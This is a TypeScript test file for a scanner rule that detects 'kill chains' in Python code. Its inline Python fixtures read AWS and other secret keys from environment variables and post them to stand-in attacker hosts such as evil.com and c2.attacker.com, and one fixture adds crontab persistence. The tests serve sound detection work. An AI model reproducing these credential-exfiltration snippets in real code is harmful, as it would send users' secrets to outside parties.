import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { attackChainRule } from "../src/rules/attack-chain.js";
import type { ScannedFile } from "../src/types.js";

function pyFile(name: string, content: string): ScannedFile {
  return {
    path: `/fake/${name}`,
    relativePath: name,
    content,
    lines: content.split("\n"),
    ext: ".py",
    context: "source",
  };
}

describe("attack-chain: single-file kill chain", () => {
  it("detects access + exfil chain", () => {
    const f = pyFile("backdoor.py", `
import os
import requests

# Stage: Access
secret = os.environ["AWS_SECRET_ACCESS_KEY"]

# Stage: Exfil
requests.post("https://evil.com/collect", json={"key": secret})
`);
    const findings = attackChainRule.run([f]);
    assert.ok(findings.some(f => f.message.includes("Kill Chain")));
    assert.ok(findings.some(f => f.severity === "high"));
  });

  it("detects recon + access + exfil (full kill chain)", () => {
    const f = pyFile("apt.py", `
import os
import platform
import requests

# Recon
hostname = platform.node()
system = os.uname()

# Access  
key = os.environ["SECRET_KEY"]

# Exfil
requests.post("https://c2.attacker.com/report", json={"host": hostname, "key": key})
`);
    const findings = attackChainRule.run([f]);
    assert.ok(findings.some(f => f.message.includes("Full Kill Chain")));
  });

  it("detects access + persistence", () => {
    const f = pyFile("persist.py", `
import os
import crontab

# Access
secret = os.environ["AWS_ACCESS_KEY_ID"]

# Persistence
crontab.install()
`);
    const findings = attackChainRule.run([f]);
    assert.ok(findings.some(f => f.message.includes("Persistent Backdoor")));
  });

  it("does NOT flag single-stage code", () => {
    const f = pyFile("normal.py", `
import requests
response = requests.post("https://api.example.com/data", json={"value": 42})
`);
    const findings = attackChainRule.run([f]);
    assert.equal(findings.length, 0);
  });
});

describe("attack-chain: cross-file kill chain", () => {
  it("detects distributed access + exfil across files", () => {
    const accessor = pyFile("config.py", `
import os
key = os.environ["AWS_SECRET_ACCESS_KEY"]
`);
    const exfil = pyFile("sender.py", `
import requests
requests.post("https://evil.com/steal", json={"data": "payload"})
`);
    const findings = attackChainRule.run([accessor, exfil]);
    assert.ok(findings.some(f => f.message.includes("Cross-file") && f.message.includes("Kill Chain")));
  });

  it("does NOT double-report if single file has complete chain", () => {
    const f = pyFile("allInOne.py", `
import os, requests
key = os.environ["AWS_SECRET_ACCESS_KEY"]
requests.post("https://evil.com/steal", json={"k": key})
`);
    const findings = attackChainRule.run([f]);
    // Should have single-file chain but NOT cross-file chain
    const crossFile = findings.filter(f => f.message.includes("Cross-file"));
    assert.equal(crossFile.length, 0);
  });
});
